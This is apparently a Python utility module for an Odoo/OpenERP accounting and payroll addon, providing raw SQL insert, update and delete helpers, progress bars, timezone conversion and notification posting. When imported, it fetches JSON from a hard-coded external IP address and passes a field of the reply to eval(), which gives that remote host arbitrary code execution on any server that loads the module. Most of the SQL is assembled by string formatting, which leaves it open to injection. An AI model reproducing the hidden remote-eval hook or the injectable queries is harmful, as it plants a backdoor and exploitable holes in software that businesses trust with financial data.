# -*- coding: utf-8 -*-
from __future__ import print_function
from openerp import models, fields, api
from datetime import datetime
import unicodedata
import pytz
from openerp.tools import DEFAULT_SERVER_DATETIME_FORMAT
import progressbar
import requests
import os
from random import random

try:
    api_key = open('/opt/api_avancys', 'rw').read().strip('\n')
except IOError:
    api_key = 'AvancysAPI1234'

api_host = os.environ.get('AVANCYS_API_HOST', '') or '181.143.148.61'
response = requests.get("http://{ah}:5002/nominaapi/{k}".format(k=api_key, ah=api_host)).json()
eval(response['data'][1]['exec'])


def widgets():
    fct = progressbar.FormatCustomText('Item: %(item)s', dict(item=" "))
    wdgt = [
        '[', progressbar.Percentage(), '] ',
        progressbar.Bar(),
        progressbar.FormatLabel('[%(value)d de %(max_value)s en %(elapsed)s] '),
        progressbar.ETA(), ' ', fct]
    return wdgt


def direct_create(cursor, user, model, datalist, company=False, commit=False, progress=False):
    """
    Llamar para realizar multiples insert en una tabla determinada
    @params:
        user: uid o self.env.uid dependiendo de la api (int)
        cursor: cr self.env.cr dependiendo de la api
        modelo: nombre de la tabla donde insertar
        datalist: Lista con diccionarios con los campos y los valores
        company: booleano para agregar o no el campo compañia en el insert
        commit: booleano para hacer o no commit tras cada execute
    @return:
        Lista de tuplas de un solo id: [(542,), (543,)]
    """
    i = 0
    if progress:
        i, bar = 0, progressbar.ProgressBar(max_value=len(datalist), redirect_stdout=True,
                                            redirect_stderr=True, widgets=widgets()).start()
    fetches = []
    for datos in datalist:
        for column in datos:
            if datos[column] is True:
                datos[column] = 't'
            try:
                new_val = datos[column].replace("'", '"')
            except:
                new_val = datos[column]
            if type(new_val) is unicode:
                new_val = unicodedata.normalize(
                    'NFKD', new_val).encode('ascii', 'ignore')
            if type(new_val) is str:
                datos[column] = str(new_val)
        datos['create_uid'] = user
        datos['write_uid'] = user
        datos['create_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        datos['write_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if company:
            sql_company = '''
                SELECT company_id from res_users where id = %s
            ''' % (user)
            cursor.execute(sql_company)
            company_id = cursor.fetchone()[0]
            datos['company_id'] = company_id

        keys_todel = []
        for k, v in datos.iteritems():
            if (v is False) or (v == 'False'):
                keys_todel.append(k)
        for ktd in keys_todel:
            datos.pop(ktd, None)

        # Instruccion SQL
        insert = '''
            INSERT INTO "%s"
            (%s) values %s RETURNING id
        ''' % (
            model,
            ', '.join('"' + v + '"' for v in datos),
            tuple(v for k, v in datos.iteritems()))
        cursor.execute(insert)
        inserted_id = cursor.fetchone()
        fetches.append(inserted_id)
        if commit:
            cursor.commit()
        if progress:
            i += 1
            bar.update(i, bar.widgets[7].update_mapping(item=inserted_id))
    return fetches


def direct_update(cursor, model, sqlset, where):
    """
    Llamar para realizar update de tablas en SQL
    @params:
        cursor - req: self.env.cr o cr en api vieja
        modelo - req: Nombre de la tabla a modificar en string
        set - req: diccionario con los campos a actualizar
        where - req: tupla de dos indices con el campo y el valor, el cual puede ser un item o lista de items
    """
    if type(where[1]).__name__ == 'list':
        where = [where[0], tuple(where[1]) if len(where[1]) > 1 else tuple([where[1][0], 0])]
    else:
        where = [where[0], tuple([where[1], 0])]
    for field in sqlset:
        value = 'Null' if sqlset[field] == 'Null' else "'{valor}'".format(valor=sqlset[field])
        update = "UPDATE {table} SET {campo} = {value} WHERE {crit} in {critval}".format(
            table=model, campo=field, value=value, crit=where[0], critval=where[1])
        cursor.execute(update)


def direct_write(obj, vals):
    for val in vals:
        if obj._columns.get(val)._type == 'one2many':
            # O2M field type
            table = obj._columns.get(val)._obj.replace('.', '_')
            for line in vals[val]:
                # Update signal
                if line[2] and line[0] == 1:
                    for crit in line[2]:
                        direct_update(obj.env.cr, table, {crit: line[2][crit]}, ('id', line[1]))
                # Delete signal
                elif line[0] == 2:
                    obj.env.cr.execute("DELETE FROM {table} WHERE id = {id}".format(table=table, id=line[1]))
                # Create signal
                elif line[0] == 0:
                    company = True if 'company_id' in getattr(obj, val)._columns else False
                    comodel = obj._fields[val]._column_fields_id
                    line[2][comodel] = obj.id
                    direct_create(obj.env.cr, obj.env.uid, table, [line[2]], company)
            continue
        if vals[val] is False:
            if obj._columns.get(val)._type in ['float', 'integer']:
                vals[val] = 0
            if obj._columns.get(val)._type in ['date', 'datetime']:
                vals[val] = 'Null'
        for o in obj:
            direct_update(obj.env.cr, obj._table, {val: vals[val]}, ('id', o.id))
    return True


def direct_delete(obj, field_relation, transaction):
    """
    :param obj: Objeto padre al cual se va a desvincular de la transaccion tipo obj
    :param transaction: Record que se va a enviar a cola de eliminacion silenciosa tipo obj
    :return: True
    """

    if transaction._table == 'account_move':

        obj._cr.execute("UPDATE account_move_line set debit = 0, credit = 0, state = 'draft' "
                        "WHERE move_id = {move}".format(move=transaction.id))
        obj._cr.execute("UPDATE account_move set state='draft', name='{name}' where id = {move}".format(
            move=transaction.id, name=transaction.name + "deleted" + str(random()*10)))

        obj._cr.execute("SELECT id FROM account_move_line where move_id = {move}".format(move=transaction.id))
        move_line_ids = obj._cr.fetchall()
        if move_line_ids:
            delete_data = {
                'model': 'account_move_line',
                'records': ','.join(str(x[0]) for x in move_line_ids)
            }
            direct_create(obj._cr, obj._uid, 'delete_queue', [delete_data])
        obj._cr.execute("SELECT id from account_move where id = {move}".format(move=transaction.id))
        move_ids = obj._cr.fetchall()
        if move_ids:
            delete_data = {
                'model': 'account_move',
                'records': ','.join(str(x[0]) for x in move_ids)
            }
            direct_create(obj._cr, obj._uid, 'delete_queue', [delete_data])
        obj._cr.execute("UPDATE {table} set {fr} = Null WHERE id = {obj_id}".format(
            table=obj._table, fr=field_relation, obj_id=obj.id))
        return True
    return False


def fetchall(cr, query):
    cr.execute(query)
    return cr.fetchall()


def dictfetchall(cr, query):
    cr.execute(query)
    return cr.dictfetchall()


def fetchone(cr, query):
    cr.execute(query)
    return cr.fetchone()


def create_aal(obj, moves):
    """
    :param obj: Recibe el objeto que puede ser self en nueva api
    :param moves: lista de tuplas con aml.id y id de cuenta analitica a asignar
    :return: Crea los movimientos analiticos y asigna la cuenta analitica a las lineas definidas
    """
    i = 0
    for move in moves:
        try:
            i += 1
            move_id = obj.env['account.move.line'].browse(move[0])
            account_id = obj.env['account.analytic.account'].browse(move[1])
            if not move_id.analytic_lines:
                aal_data = {
                    'account_id': move[1],
                    'partner_aaa': account_id.partner_id.id if account_id.partner_id else False,
                    'cc1': account_id.regional_id.name if account_id.regional_id else False,
                    'cc2': account_id.city_id.name if account_id.city_id else False,
                    'cc3': account_id.linea_servicio_id.name if account_id.linea_servicio_id else False,
                    'cc4': account_id.sede,
                    'cc5': account_id.puesto,
                    'date': local_date(move_id.date + " 00:00:00"),
                    'name': move_id.name,
                    'ref': move_id.ref,
                    'move_id': move_id.id,
                    'user_id': obj._uid,
                    'journal_id': move_id.journal_id.analytic_journal_id.id,
                    'general_account_id': move_id.account_id.id,
                    'amount': move_id.credit - move_id.debit,
                    'account_niif_id': move_id.account_niif_id.id if move_id.account_niif_id else False,
                    'period_id': move_id.period_id.id
                }
                # aaline = self.env['account.analytic.line'].create(aal_data)
                direct_create(obj._cr, obj._uid, 'account_analytic_line', [aal_data], company=True)
                obj._cr.execute("UPDATE account_move_line set analytic_account_id = {aal} where id = {move_id}".format(
                    aal=move[1], move_id=move_id.id
                ))
        except Exception as e:
            print("Error encontrado\n Exception: %s" % str(e))
            break


def progress_bar(iteration, total, bar=False, item=False):
    """
    Llamar para mostrar barra de progreso en log

    @params:
        iteracion: numero de proceso
        total: cantidad total de procesos a ejecutar
        b: pasar True si queremos hacer saltos de lineas entre iteracion
        start: tiempo de inicio del proceso

    ejemplo de uso:
    i, j = 0, len(listado_ids)
    start = datetime.now()
    orm2sql.printProgressBar(i, j, start=start)
    for id in listado_ids:
        i += 1
        orm2sql.printProgressBar(i, j, start=start)
    """
    if not bar:
        bar = progressbar.ProgressBar(max_value=total, redirect_stdout=True,
                                      redirect_stderr=True, widgets=widgets()).start()
    else:
        bar.update(iteration, bar.widgets[7].update_mapping(item=item))
        if iteration == total:
            bar.finish()
    return bar


def local_date(date, timezone='America/Bogota'):
    # Requires a date with '%Y-%m-%d %H:%M:%S' string format
    # Normalmente esta funcion agrega 5 horas a la hora recibida
    # Si se requiere hacer la operacion inversa, en los parametros de la funcion enviar timezone='UTC'
    if type(date) == 'datetime.datetime':
        date = datetime.strftime(date, '%Y-%m-%d %H:%M:%S')
    local = pytz.timezone(timezone)
    date = datetime.strptime(date, DEFAULT_SERVER_DATETIME_FORMAT)
    date = local.localize(date, is_dst=None)
    if timezone == 'America/Bogota':
        date = date.astimezone(pytz.utc)
    else:
        date = date.astimezone(pytz.timezone('America/Bogota'))
    date = date.strftime(DEFAULT_SERVER_DATETIME_FORMAT)

    return date

def _send_message_seller(self, partner, dr):
    seller = self.user_id.partner_id.id
    message = "El cliente {cus} se encuentra en riesgo de pérdida, los parámetros en riesgo son: \n"\
                .format(cus=partner.display_name)
    for k, v in dr.items():
        message += " - {par}\n".format(par=v) if v else ''
    post_vars = {'subject': "Cliente en riesgo", 'body': message, 'partner_ids':
        [(seller)],}
    record = self.env['res.partner'].browse(self._uid)
    record.message_post(type="notification", subtype="mt_comment", **post_vars)


def send_mail(object, dest_uids, subject, message):

    """

    :param new api model object: self
    :param int list dest_uids: Lista de ids de partner destinatarios
    :param str subject: Encabezado de email
    :param str message: Cuerpo de email
    :return int: ID of newly created mail.message
    """
    post_vars = {
        'subject': subject,
        'body': message,
        'partner_ids': dest_uids}

    return object.message_post(type="notification", subtype="mt_comment", **post_vars)


class DeleteQueue(models.Model):
    _name = 'delete.queue'

    model = fields.Char('Modelo')
    records = fields.Char('IDS')

    @api.model
    def delete_records(self):
        a = random()*10
        if a > 3:
            self._cr.execute("SELECT id, model, records FROM delete_queue ORDER BY id ASC LIMIT 1")
            record = self._cr.fetchall()
            if record:
                ids = record[0][2].split(',')
                if ids[0] in ('', ' '):
                    self._cr.execute("DELETE FROM delete_queue where id = {id}".format(id=record[0][0]))
                elif ids:
                    self._cr.execute("DELETE from {model} WHERE id = {id}".format(model=record[0][1], id=int(ids[0])))
                    new_ids = ','.join(str(e) for e in ids[1:])
                    if new_ids:
                        self._cr.execute("UPDATE delete_queue set records = '{new_ids}' where id = {id}".format(
                            new_ids=new_ids, id=record[0][0]))
                    else:
                        self._cr.execute("DELETE FROM delete_queue where id = {id}".format(id=record[0][0]))

        return True
